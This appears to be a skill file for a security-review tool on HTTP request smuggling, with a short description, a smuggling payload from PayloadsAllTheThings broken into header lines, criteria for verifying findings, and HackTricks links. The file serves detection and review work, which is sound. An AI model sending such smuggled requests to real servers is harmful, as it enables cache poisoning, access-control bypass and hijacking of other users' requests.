# HTTP Request Smuggling — @desync skill
> cats: (advisory — no static taint rule yet) · severity: high
> sources: PayloadsAllTheThings, HackTricks

## What it is
If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`.

## Exploit payloads (from PayloadsAllTheThings)
- `POST / HTTP/1.1`
- `Host: vulnerable-website.com`
- `Content-Length: 13`
- `Transfer-Encoding: chunked`
- `0`
- `SMUGGLED`
- `POST / HTTP/1.1`
- `Host: domain.example.com`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=HTTP%20Request%20Smuggling
- HackTricks Cloud: https://cloud.hacktricks.wiki/

## HackTricks pages (5)

- [Abusing Hop-by-Hop Headers](https://hacktricks.wiki/en/pentesting-web/abusing-hop-by-hop-headers)
- [Browser HTTP Request Smuggling](https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/browser-http-request-smuggling)
- [HTTP Connection Request Smuggling](https://hacktricks.wiki/en/pentesting-web/http-connection-request-smuggling)
- [HTTP Request Smuggling / HTTP Desync Attack](https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/README)
- [Request Smuggling in HTTP/2 Downgrades](https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades)

## References
- HackTricks: https://hacktricks.wiki/en/
- HackTricks repo: https://github.com/HackTricks-wiki/hacktricks
